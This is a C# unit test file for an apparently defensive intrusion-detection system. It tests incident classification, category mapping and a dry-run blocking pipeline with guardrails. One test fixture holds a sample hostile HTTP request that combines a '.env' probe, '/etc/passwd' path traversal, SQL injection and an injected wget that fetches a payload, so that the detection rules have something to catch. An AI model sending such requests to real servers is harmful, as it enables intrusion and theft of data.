using Microsoft.Extensions.Options;
using Viegard.Application.Classifiers;
using Viegard.Application.Correlation;
using Viegard.Application.Detection;
using Viegard.Application.Policy;
using Viegard.Application.Queues;
using Viegard.Domain.Classifications;
using Viegard.Domain.Decisions;
using Viegard.Domain.Events;
using Viegard.Domain.Incidents;
using Viegard.Persistence.InMemory;

namespace Viegard.Application.Tests;

public sealed class DeterministicIncidentClassifierTests
{
    [Fact]
    public async Task Rich_mdaemon_incident_yields_credential_attack_and_block_recommendation()
    {
        var store = new InMemoryIncidentStore();
        var incident = Incident(
            "ip=203.0.113.20",
            [
                Evidence("Rule mdaemon.security-event: MDaemon blocked the IP address.", 0.9),
                Evidence("Rule mdaemon.security-event: MDaemon reported an authentication failure.", 0.4),
                Evidence("Rule mdaemon.security-event: MDaemon blocked the IP address.", 0.9),
                Evidence("Rule mdaemon.security-event: MDaemon screening blocked the connection.", 0.6),
                Evidence("Rule mdaemon.security-event: MDaemon reported an authentication failure.", 0.4),
            ]);
        await store.UpsertAsync(incident);

        var outcome = await Classifier(store).ClassifyAsync(Subject(incident.Id));

        Assert.True(outcome.Succeeded);
        var classification = Assert.IsType<Classification>(outcome.Classification);
        Assert.Equal(DeterministicIncidentClassifier.Id, classification.ClassifierId);
        Assert.Null(classification.Model);
        Assert.Equal("credential-attack", classification.Category);
        Assert.InRange(classification.Confidence, 0.0, 1.0);
        Assert.InRange(classification.Severity, Classification.MinSeverity, Classification.MaxSeverity);
        Assert.Equal("block-source-ip", classification.RecommendedAction);
        Assert.Equal(5, classification.Reasons.Count);
    }

    [Fact]
    public async Task Low_evidence_incident_has_low_confidence_and_review_recommendation()
    {
        var store = new InMemoryIncidentStore();
        var incident = Incident("ip=198.51.100.15", [Evidence("Rule http.error-status: HTTP status 404.", 0.08)]);
        await store.UpsertAsync(incident);

        var outcome = await Classifier(store).ClassifyAsync(Subject(incident.Id));

        Assert.True(outcome.Succeeded);
        var classification = Assert.IsType<Classification>(outcome.Classification);
        Assert.Equal("suspicious-activity", classification.Category);
        Assert.InRange(classification.Confidence, 0.0, 0.1);
        Assert.Equal("flag-for-review", classification.RecommendedAction);
    }

    [Theory]
    [InlineData("Rule http.path-traversal: decoded URI contains parent-directory traversal.", "path-traversal")]
    [InlineData("Rule http.sql-injection: UNION SELECT SQL injection pattern.", "sql-injection")]
    [InlineData("Rule http.command-injection: command separator appeared in the URI.", "command-injection")]
    [InlineData("Rule http.suspicious-user-agent: scanner or automation User-Agent matched sqlmap.", "vulnerability-scanner")]
    [InlineData("Rule http.sensitive-path: sensitive path probe matched '/.env'.", "reconnaissance")]
    [InlineData("Rule test: unexplained suspicious condition.", "suspicious-activity")]
    public async Task Category_keyword_mapping_uses_dominant_evidence_description(string description, string expectedCategory)
    {
        var store = new InMemoryIncidentStore();
        var incident = Incident("ip=198.51.100.16", [Evidence(description, 1.0)]);
        await store.UpsertAsync(incident);

        var outcome = await Classifier(store).ClassifyAsync(Subject(incident.Id));

        var classification = Assert.IsType<Classification>(outcome.Classification);
        Assert.Equal(expectedCategory, classification.Category);
    }

    [Fact]
    public async Task Empty_evidence_incident_returns_valid_low_signal_classification()
    {
        var store = new InMemoryIncidentStore();
        var incident = Incident("mail-from=sender@example.com", []);
        await store.UpsertAsync(incident);

        var outcome = await Classifier(store).ClassifyAsync(Subject(incident.Id));

        Assert.True(outcome.Succeeded);
        var classification = Assert.IsType<Classification>(outcome.Classification);
        Assert.Equal("suspicious-activity", classification.Category);
        Assert.Equal(0.0, classification.Confidence);
        Assert.Equal(0, classification.Severity);
        Assert.Empty(classification.Reasons);
        Assert.Equal("flag-for-review", classification.RecommendedAction);
    }

    [Fact]
    public async Task Mail_incident_recommends_review_even_when_score_is_high()
    {
        var store = new InMemoryIncidentStore();
        var incident = Incident(
            "mail-from=sender@example.com",
            [
                Evidence("Rule mail.link-count: message contains many links.", 2.0),
                Evidence("Rule mail.attachment-double-extension: attachment name is suspicious.", 2.0),
            ]);
        await store.UpsertAsync(incident);

        var outcome = await Classifier(store).ClassifyAsync(Subject(incident.Id));

        var classification = Assert.IsType<Classification>(outcome.Classification);
        Assert.Equal("flag-for-review", classification.RecommendedAction);
    }

    [Fact]
    public async Task Reasons_are_limited_to_top_ten_evidence_descriptions()
    {
        var store = new InMemoryIncidentStore();
        var incident = Incident(
            "ip=198.51.100.19",
            Enumerable.Range(1, 12)
                .Select(i => Evidence($"Rule test: evidence {i}.", i))
                .ToList());
        await store.UpsertAsync(incident);

        var outcome = await Classifier(store).ClassifyAsync(Subject(incident.Id));

        var classification = Assert.IsType<Classification>(outcome.Classification);
        Assert.Equal(10, classification.Reasons.Count);
        Assert.Equal("Rule test: evidence 12.", classification.Reasons[0]);
        Assert.DoesNotContain("Rule test: evidence 1.", classification.Reasons);
    }

    [Fact]
    public async Task Non_incident_subject_fails_unknown()
    {
        var outcome = await Classifier(new InMemoryIncidentStore()).ClassifyAsync(new ClassificationSubject
        {
            Kind = ClassificationSubjectKind.MailMessage,
            SubjectId = Guid.NewGuid(),
        });

        Assert.False(outcome.Succeeded);
        Assert.Equal(ClassificationFailureKind.Unknown, outcome.FailureKind);
    }

    [Fact]
    public async Task Extreme_scores_are_clamped_to_classification_invariants()
    {
        var store = new InMemoryIncidentStore();
        var high = Incident("ip=198.51.100.17", [Evidence("Rule http.sql-injection: SQL indicator.", 999)]);
        var low = Incident(
            "ip=198.51.100.18",
            [
                Evidence("Rule test: negative score.", -999),
                Evidence("Rule test: not a number.", double.NaN),
            ]);
        await store.UpsertAsync(high);
        await store.UpsertAsync(low);

        var highClassification = Assert.IsType<Classification>(
            (await Classifier(store).ClassifyAsync(Subject(high.Id))).Classification);
        var lowClassification = Assert.IsType<Classification>(
            (await Classifier(store).ClassifyAsync(Subject(low.Id))).Classification);

        Assert.Equal(1.0, highClassification.Confidence);
        Assert.Equal(Classification.MaxSeverity, highClassification.Severity);
        Assert.Equal(0.0, lowClassification.Confidence);
        Assert.Equal(Classification.MinSeverity, lowClassification.Severity);
    }

    [Fact]
    public void Options_validator_rejects_non_positive_values()
    {
        var result = new ClassifierOptionsValidator().Validate(
            Options.DefaultName,
            new ClassifierOptions
            {
                ScoreForFullConfidence = 0,
                SeverityPerScorePoint = -1,
                BlockRecommendationScore = double.PositiveInfinity,
            });

        Assert.False(result.Succeeded);
        Assert.NotNull(result.Failures);
        Assert.Equal(3, result.Failures!.Count());
    }

    [Fact]
    public async Task Deterministic_spine_end_to_end_produces_dry_run_decision()
    {
        var eventStore = new InMemoryEventStore();
        var incidentStore = new InMemoryIncidentStore();
        var classificationStore = new InMemoryClassificationStore();
        var decisionStore = new InMemoryDecisionStore();
        var eventQueue = new ChannelWorkQueue<Guid>("events");
        var incidentQueue = new ChannelWorkQueue<IncidentWorkItem>("incidents");
        var classificationQueue = new ChannelWorkQueue<ClassificationWorkItem>("classifications");
        var normalizedEvent = HostileHttpEvent();
        await eventStore.AddAsync(normalizedEvent);
        await eventQueue.EnqueueAsync(normalizedEvent.Id);

        var eventLease = await eventQueue.LeaseAsync();
        var correlatedEvent = await eventStore.GetAsync(eventLease.Message);
        Assert.NotNull(correlatedEvent);
        var correlator = new TimeWindowCorrelator(HttpRules(), incidentStore, new CorrelationOptions());
        var incidents = await correlator.CorrelateAsync(correlatedEvent);
        var incident = Assert.Single(incidents);
        await incidentQueue.EnqueueAsync(new IncidentWorkItem(incident.Id));
        await eventLease.CompleteAsync();

        var incidentLease = await incidentQueue.LeaseAsync();
        var classificationOutcome = await Classifier(incidentStore).ClassifyAsync(Subject(incidentLease.Message.IncidentId));
        Assert.True(classificationOutcome.Succeeded);
        var classification = Assert.IsType<Classification>(classificationOutcome.Classification);
        await classificationStore.AddAsync(classification);
        await classificationQueue.EnqueueAsync(new ClassificationWorkItem(classification.Id));
        await incidentStore.UpsertAsync(incident with { State = IncidentState.Classified });
        await incidentLease.CompleteAsync();

        var options = new PolicyOptions();
        var policyEngine = new DefaultPolicyEngine(
            Options.Create(options),
            new ProtectedAddressList(options.ProtectedCidrs),
            incidentStore,
            new InMemoryGuardrailStateStore());
        var classificationLease = await classificationQueue.LeaseAsync();
        var queuedClassification = await classificationStore.GetAsync(classificationLease.Message.ClassificationId);
        Assert.NotNull(queuedClassification);
        var decision = await policyEngine.EvaluateAsync(
            queuedClassification,
            new PolicyContext
            {
                DryRun = options.Posture.DryRun,
                ManualApprovalMode = options.Posture.ManualApprovalMode,
                EmergencyStop = options.Posture.EmergencyStop,
            });
        await decisionStore.AddAsync(decision);
        await incidentStore.UpsertAsync(incident with { State = IncidentState.Decided });
        await classificationLease.CompleteAsync();

        var persistedDecision = await decisionStore.GetAsync(decision.Id);
        var decidedIncident = await incidentStore.GetAsync(incident.Id);
        Assert.NotNull(persistedDecision);
        Assert.Equal(DecisionOutcome.DryRun, persistedDecision.Outcome);
        Assert.Equal(IncidentState.Decided, decidedIncident?.State);
        Assert.Equal("block-source-ip", classification.RecommendedAction);
        Assert.Equal(1.0, classification.Confidence);
        AssertGuardrailChain(persistedDecision);
    }

    private static DeterministicIncidentClassifier Classifier(InMemoryIncidentStore store) =>
        new(store, Options.Create(new ClassifierOptions()));

    private static ClassificationSubject Subject(Guid incidentId) => new()
    {
        Kind = ClassificationSubjectKind.Incident,
        SubjectId = incidentId,
    };

    private static Incident Incident(string correlationKey, IReadOnlyList<EvidenceItem> evidence)
    {
        var now = DateTimeOffset.UtcNow;
        return new Incident
        {
            Id = Guid.NewGuid(),
            CorrelationKey = correlationKey,
            WindowStart = now.AddMinutes(-5),
            WindowEnd = now,
            EventIds = [],
            Evidence = evidence,
            State = IncidentState.Open,
        };
    }

    private static EvidenceItem Evidence(string description, double score) => new()
    {
        Description = description,
        Score = score,
        EventId = Guid.NewGuid(),
    };

    private static IReadOnlyList<IDetectionRule> HttpRules() =>
    [
        new SensitivePathHttpDetectionRule(new DetectionOptions()),
        new PathTraversalHttpDetectionRule(new DetectionOptions()),
        new SqlInjectionHttpDetectionRule(new DetectionOptions()),
        new CommandInjectionHttpDetectionRule(new DetectionOptions()),
        new SuspiciousUserAgentHttpDetectionRule(new DetectionOptions()),
        new ErrorStatusHttpDetectionRule(new DetectionOptions()),
    ];

    private static NormalizedEvent HostileHttpEvent()
    {
        var id = Guid.NewGuid();
        var remoteAddress = "198.51.100.20";
        return new NormalizedEvent
        {
            Id = id,
            SourceId = "nginx-test",
            SourceType = "nginx",
            OccurredAt = DateTimeOffset.UtcNow,
            Entities =
            [
                new EntityRef(EntityKind.IpAddress, remoteAddress),
            ],
            Payload = new HttpRequestEvent
            {
                RemoteAddress = remoteAddress,
                Method = "GET",
                Uri = "/.env?file=../../etc/passwd&q=%27%20or%201=1%20union%20select%200x4141;wget%20http://example.invalid/payload",
                Protocol = "HTTP/1.1",
                StatusCode = 404,
                UserAgent = "sqlmap/1.7",
            },
            RawObservationId = Guid.NewGuid(),
        };
    }

    private static void AssertGuardrailChain(Decision decision)
    {
        var names = decision.Guardrails.Select(g => g.GuardrailName).ToHashSet(StringComparer.Ordinal);
        Assert.Contains(PolicyGuardrailNames.EmergencyStop, names);
        Assert.Contains(PolicyGuardrailNames.ProtectedAddress, names);
        Assert.Contains(PolicyGuardrailNames.Allowlist, names);
        Assert.Contains(PolicyGuardrailNames.Thresholds, names);
        Assert.Contains(PolicyGuardrailNames.RepeatOffender, names);
        Assert.Contains(PolicyGuardrailNames.RateCaps, names);
        Assert.Contains(PolicyGuardrailNames.CircuitBreaker, names);
        Assert.Contains(PolicyGuardrailNames.PostureOverlay, names);
    }
}
